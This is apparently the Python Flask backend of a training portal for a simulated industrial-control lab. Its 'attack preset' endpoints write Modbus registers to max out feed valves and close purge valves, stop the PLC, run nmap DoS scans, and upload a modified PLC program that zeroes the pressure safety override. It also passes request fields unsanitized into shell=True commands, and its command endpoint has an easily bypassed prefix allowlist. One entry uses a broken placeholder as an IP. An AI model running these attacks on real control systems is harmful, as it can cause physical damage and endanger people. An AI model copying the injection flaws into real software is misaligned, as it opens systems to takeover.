#!/usr/bin/env python3
"""
OT Lab Portal — Backend Server v2
Deploy on GRFICSv3 VM (192.168.10.11)
Run: nohup python3 server.py > portal.log 2>&1 &
Access: http://192.168.10.11:9000
"""

from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import subprocess
import json
import os

app = Flask(__name__, static_folder='static')
CORS(app)

# ─── Helpers ──────────────────────────────────────────────────────────────────

def run_cmd(cmd, timeout=20):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return {"stdout": result.stdout.strip(), "stderr": result.stderr.strip(), "rc": result.returncode, "cmd": cmd}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timeout", "rc": -1, "cmd": cmd}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "rc": -1, "cmd": cmd}

def get_pressure():
    cmd = """docker exec simulation bash -c "echo '{\\"request\\": \\"read\\"}' | nc 127.0.0.1 55555" """
    r = run_cmd(cmd, timeout=5)
    if r["rc"] == 0 and r["stdout"]:
        try:
            data = json.loads(r["stdout"])
            return {
                "pressure": round(data["outputs"]["pressure"], 1),
                "level": round(data["outputs"]["liquid_level"], 1),
                "f1_valve": round(data["state"]["f1_valve_pos"], 1),
                "f2_valve": round(data["state"]["f2_valve_pos"], 1),
                "purge_valve": round(data["state"]["purge_valve_pos"], 1),
                "product_valve": round(data["state"]["product_valve_pos"], 1),
                "purge_flow": round(data["outputs"]["purge_flow"], 2),
                "product_flow": round(data["outputs"]["product_flow"], 2),
                "f1_flow": round(data["outputs"]["f1_flow"], 2),
                "f2_flow": round(data["outputs"]["f2_flow"], 2),
                "e_stop": data["state"]["e_stop"],
                "ok": True
            }
        except:
            pass
    return {"ok": False, "pressure": 0, "level": 0}

# ─── Static ───────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

# ─── System ───────────────────────────────────────────────────────────────────

@app.route('/api/containers')
def containers():
    r = run_cmd("docker ps --format '{{.Names}}|{{.Status}}'")
    containers = []
    for line in r["stdout"].splitlines():
        if "|" in line:
            name, status = line.split("|", 1)
            containers.append({
                "name": name.strip(),
                "status": status.strip(),
                "up": "Up" in status
            })
    return jsonify(containers)

@app.route('/api/containers/restart/<name>', methods=['POST'])
def restart_container(name):
    allowed = ['simulation', 'plc', 'HMI', 'kali', 'caldera', 'router']
    if name not in allowed:
        return jsonify({"error": "Not allowed"}), 403
    r = run_cmd(f"docker restart {name}", timeout=30)
    return jsonify(r)

@app.route('/api/io-status')
def io_status():
    results = []
    for i in range(9, 14):
        ip = f"192.168.243.{i}"
        r = run_cmd(f"docker exec simulation nc -zv {ip} 502 2>&1", timeout=3)
        results.append({
            "ip": ip,
            "up": "Connected" in r["stdout"] or "Connected" in r["stderr"]
        })
    return jsonify(results)

@app.route('/api/pressure')
def pressure():
    return jsonify(get_pressure())

# ─── PLC ──────────────────────────────────────────────────────────────────────

@app.route('/api/plc/stop', methods=['POST'])
def stop_plc():
    cmd = """docker exec kali python3 -c "
import requests
s = requests.Session()
s.post('http://plc.ot.sdx:8080/login', data={'username':'openplc','password':'openplc'})
r = s.get('http://plc.ot.sdx:8080/stop_plc')
print(r.status_code, r.url)
" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = "POST http://plc.ot.sdx:8080/login | GET http://plc.ot.sdx:8080/stop_plc"
    return jsonify(r)

@app.route('/api/plc/start', methods=['POST'])
def start_plc():
    cmd = """docker exec kali python3 -c "
import requests
s = requests.Session()
s.post('http://plc.ot.sdx:8080/login', data={'username':'openplc','password':'openplc'})
r = s.get('http://plc.ot.sdx:8080/start_plc')
print(r.status_code, r.url)
" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = "POST http://plc.ot.sdx:8080/login | GET http://plc.ot.sdx:8080/start_plc"
    return jsonify(r)

@app.route('/api/plc/status')
def plc_status():
    cmd = """docker exec kali python3 -c "
import requests
s = requests.Session()
s.post('http://plc.ot.sdx:8080/login', data={'username':'openplc','password':'openplc'})
r = s.get('http://plc.ot.sdx:8080/dashboard')
import re
m = re.search(r'Status.*?(Running|Stopped)', r.text)
print(m.group(1) if m else 'Unknown')
" """
    r = run_cmd(cmd, timeout=10)
    status = r["stdout"].strip() if r["rc"] == 0 else "Unknown"
    return jsonify({"status": status})

# ─── Modbus ───────────────────────────────────────────────────────────────────

@app.route('/api/modbus/write', methods=['POST'])
def modbus_write():
    data = request.json
    ip = data.get("ip")
    register = data.get("register", 1)
    value = data.get("value", 0)
    slave = data.get("slave", 247)

    allowed_ips = [f"192.168.243.{i}" for i in range(9, 14)] + ["plc.ot.sdx"]
    if ip not in allowed_ips:
        return jsonify({"error": "IP not allowed"}), 403

    cmd = f"""docker exec kali python3 -c "from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('{ip}', port=502); c.connect(); c.write_register({register}, {value}, slave={slave}); c.close(); print('done')" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = f"write_register(ip={ip}, reg={register}, value={value}, slave={slave})"
    return jsonify(r)

@app.route('/api/modbus/read', methods=['POST'])
def modbus_read():
    data = request.json
    ip = data.get("ip", "purge.ot.sdx")
    register = data.get("register", 1)
    count = data.get("count", 2)
    slave = data.get("slave", 247)
    func = data.get("func", "input")  # input or holding

    if func == "holding":
        read_func = f"c.read_holding_registers(address={register}, count={count}, slave={slave})"
        fc = "FC3 read_holding_registers"
    else:
        read_func = f"c.read_input_registers(address={register}, count={count}, slave={slave})"
        fc = "FC4 read_input_registers"

    cmd = f"""docker exec kali python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('{ip}', port=502)
c.connect()
r = {read_func}
print(r.registers)
c.close()
" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = f"{fc}(ip={ip}, address={register}, count={count}, slave={slave})"
    return jsonify(r)

# ─── Attack Presets ───────────────────────────────────────────────────────────

@app.route('/api/attack/io-manipulation', methods=['POST'])
def attack_io():
    data = request.json
    action = data.get("action", "attack")

    if action == "attack":
        commands = [
            ("{ENV['feed1']}", 1, 65535, "Feed1 → MAX"),
            ("feed2.ot.sdx", 1, 65535, "Feed2 → MAX"),
            ("purge.ot.sdx", 1, 0,     "Purge → CLOSED"),
            ("product.ot.sdx", 1, 0,     "Product → CLOSED"),
        ]
    else:
        commands = [
            ("{ENV['feed1']}", 1, 0, "Feed1 → 0 (restore)"),
            ("feed2.ot.sdx", 1, 0, "Feed2 → 0 (restore)"),
            ("purge.ot.sdx", 1, 0, "Purge → 0 (restore)"),
            ("product.ot.sdx", 1, 0, "Product → 0 (restore)"),
        ]

    results = []
    for ip, reg, val, label in commands:
        cmd = f"""docker exec kali python3 -c "from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('{ip}', port=502); c.connect(); c.write_register({reg}, {val}, slave=247); c.close(); print('done')" """
        r = run_cmd(cmd, timeout=15)
        results.append({
            "ip": ip,
            "value": val,
            "label": label,
            "friendly_cmd": f"write_register(ip={ip}, reg={reg}, value={val}, slave=247)",
            "result": r["stdout"] or r["stderr"]
        })
    return jsonify(results)

@app.route('/api/attack/pressure-setpoint', methods=['POST'])
def attack_pressure():
    data = request.json
    pressure_val = data.get("pressure_sp", 65535)
    override_val = data.get("override_sp", 0)

    cmd = f"""docker exec kali python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('plc.ot.sdx', port=502)
c.connect()
c.write_register(2, {pressure_val})
c.write_register(3, {override_val})
c.close()
print('done')
" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = f"write_register(ip=plc.ot.sdx, reg=2, value={pressure_val}) | write_register(reg=3, value={override_val})"
    return jsonify(r)

@app.route('/api/attack/pressure-restore', methods=['POST'])
def pressure_restore():
    cmd = """docker exec kali python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('plc.ot.sdx', port=502)
c.connect()
c.write_register(2, 55295)
c.write_register(3, 31675)
c.close()
print('done')
" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = "write_register(ip=plc.ot.sdx, reg=2, value=55295) | write_register(reg=3, value=31675)"
    return jsonify(r)

@app.route('/api/attack/modbus-read-purge', methods=['POST'])
def modbus_read_purge():
    cmd = """docker exec kali python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('purge.ot.sdx', port=502)
c.connect()
r = c.read_input_registers(address=1, count=2, slave=247)
print('Purge registers:', r.registers)
c.close()
" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = "FC4 read_input_registers(ip=purge.ot.sdx, address=1, count=2, slave=247)"
    return jsonify(r)

@app.route('/api/attack/modbus-write-purge', methods=['POST'])
def modbus_write_purge():
    data = request.json
    value = data.get("value", 65535)
    cmd = f"""docker exec kali python3 -c "from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('purge.ot.sdx', port=502); c.connect(); c.write_register(1, {value}, slave=247); c.close(); print('done')" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = f"FC6 write_register(ip=purge.ot.sdx, address=1, value={value}, slave=247)"
    return jsonify(r)

# ─── Nmap ─────────────────────────────────────────────────────────────────────

@app.route('/api/attack/nmap', methods=['POST'])
def nmap_attack():
    data = request.json
    scan_type = data.get("type", "recon")

    if scan_type == "recon":
        cmd = "docker exec kali nmap -sV 192.168.243.0/24"
        friendly = "nmap -sV 192.168.243.0/24  # OT zone service discovery"
    elif scan_type == "modbus-discover":
        cmd = "docker exec kali nmap --script modbus-discover 192.168.243.0/24 -p 502"
        friendly = "nmap --script modbus-discover 192.168.243.0/24 -p 502  # Modbus device discovery"
    elif scan_type == "aggressive":
        cmd = "docker exec kali nmap -sV -O -A plc.ot.sdx"
        friendly = "nmap -sV -O -A plc.ot.sdx  # OS fingerprint + aggressive scan"
    elif scan_type == "dos":
        cmd = "docker exec kali nmap --script dos plc.ot.sdx"
        friendly = "nmap --script dos plc.ot.sdx  # DoS script scan"
    else:
        return jsonify({"error": "Unknown scan type"}), 400

    r = run_cmd(cmd, timeout=120)
    r["friendly_cmd"] = friendly
    return jsonify(r)

@app.route('/api/attack/msf-modbus-banner', methods=['POST'])
def msf_modbus_banner():
    cmd = """docker exec kali msfconsole -q -x "use auxiliary/scanner/scada/modbus_banner_grabbing; set RHOSTS 192.168.243.1-20; set RPORT 502; run; exit" """
    r = run_cmd(cmd, timeout=60)
    r["friendly_cmd"] = "msfconsole: use auxiliary/scanner/scada/modbus_banner_grabbing | RHOSTS=192.168.243.1-20 | RPORT=502 | run"
    return jsonify(r)

# ─── Write Coil — Stop/Start Reactor ─────────────────────────────────────────

@app.route('/api/attack/write-coil', methods=['POST'])
def write_coil():
    data = request.json
    value = data.get("value", False)  # True = start, False = stop
    val_str = "True" if value else "False"
    action = "START" if value else "STOP"
    cmd = f"""docker exec kali python3 -c "from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('plc.ot.sdx', port=502); c.connect(); r = c.write_coil(40, {val_str}, slave=1); print(r); c.close()" """
    r = run_cmd(cmd, timeout=15)
    r["friendly_cmd"] = f"FC5 write_coil(ip=plc.ot.sdx, coil=40, value={val_str}, slave=1)  # run_bit %QX5.0 → {action}"
    return jsonify(r)

# ─── Kill Kali processes ───────────────────────────────────────────────────────

@app.route('/api/kali/kill', methods=['POST'])
def kill_kali():
    cmd = "docker exec kali bash -c 'killall nmap python3 2>/dev/null; echo done'"
    r = run_cmd(cmd, timeout=5)
    r["friendly_cmd"] = "docker exec kali killall nmap python3"
    return jsonify(r)

# ─── Upload malicious ST file ─────────────────────────────────────────────────

@app.route('/api/attack/upload-malicious-st', methods=['POST'])
def upload_malicious_st():
    # Step 1: Copy original
    r1 = run_cmd("docker cp plc:/workdir/webserver/st_files/326339.st /tmp/original.st")

    # Step 2: Create malicious version
    modify_cmd = """python3 -c "
with open('/tmp/original.st', 'r') as f:
    content = f.read()

# Raise pressure setpoint to max
content = content.replace(
    'pressure_sp AT %MW2 : UINT := 55295',
    'pressure_sp AT %MW2 : UINT := 65535'
)

# Disable safety protection
content = content.replace(
    'override_sp_real : REAL := 2900.0',
    'override_sp_real : REAL := 0.0'
)

# Force product_flow_setpoint to max
content = content.replace(
    'product_flow_setpoint := 30000',
    'product_flow_setpoint := 65535'
)

with open('/tmp/malicious.st', 'w') as f:
    f.write(content)
print('malicious.st created')
" """
    r2 = run_cmd(modify_cmd)

    # Step 3: Upload via HTTP to OpenPLC
    upload_cmd = """docker exec kali python3 -c "
import requests, os
s = requests.Session()
s.post('http://plc.ot.sdx:8080/login', data={'username':'openplc','password':'openplc'})
# Upload the file
with open('/tmp/malicious.st', 'rb') as f:
    r = s.post('http://plc.ot.sdx:8080/upload-program',
               files={'file': ('malicious.st', f, 'text/plain')})
print(r.status_code, r.url)
" """
    # Copy file into kali container first
    r3 = run_cmd("docker cp /tmp/malicious.st kali:/tmp/malicious.st")
    r4 = run_cmd(upload_cmd, timeout=30)

    return jsonify({
        "step1_copy": r1["stdout"] or r1["stderr"],
        "step2_modify": r2["stdout"] or r2["stderr"],
        "step3_copy_to_kali": r3["stdout"] or r3["stderr"],
        "step4_upload": r4["stdout"] or r4["stderr"],
        "friendly_cmd": "Modify 326339.st: pressure_sp=65535, override_sp_real=0.0, product_flow_setpoint=65535 | POST http://plc.ot.sdx:8080/upload-program"
    })

@app.route('/api/attack/restore-original-st', methods=['POST'])
def restore_original_st():
    # Copy original back to kali and upload
    r1 = run_cmd("docker cp plc:/workdir/webserver/st_files_default/326339.st /tmp/restore.st")
    r2 = run_cmd("docker cp /tmp/restore.st kali:/tmp/restore.st")
    upload_cmd = """docker exec kali python3 -c "
import requests
s = requests.Session()
s.post('http://plc.ot.sdx:8080/login', data={'username':'openplc','password':'openplc'})
with open('/tmp/restore.st', 'rb') as f:
    r = s.post('http://plc.ot.sdx:8080/upload-program',
               files={'file': ('326339.st', f, 'text/plain')})
print(r.status_code, r.url)
" """
    r3 = run_cmd(upload_cmd, timeout=30)
    return jsonify({
        "result": r3["stdout"] or r3["stderr"],
        "friendly_cmd": "Restore original 326339.st | POST http://plc.ot.sdx:8080/upload-program"
    })

# ─── Kali exec ────────────────────────────────────────────────────────────────

@app.route('/api/kali/exec', methods=['POST'])
def kali_exec():
    data = request.json
    cmd = data.get("cmd", "")
    if not cmd:
        return jsonify({"error": "No command"}), 400
    allowed_prefixes = [
        "python3", "ping", "nmap", "ip route", "/usr/sbin/route",
        "curl", "nc ", "echo", "cat /proc", "ls", "id", "whoami"
    ]
    if not any(cmd.strip().startswith(p) for p in allowed_prefixes):
        return jsonify({"error": "Command not allowed in terminal. Use attack buttons."}), 403
    r = run_cmd(f"docker exec kali {cmd}", timeout=30)
    r["friendly_cmd"] = f"docker exec kali {cmd}"
    return jsonify(r)

if __name__ == '__main__':
    print("OT Lab Portal v2 starting on http://0.0.0.0:9000")
    app.run(host='0.0.0.0', port=9000, debug=False)
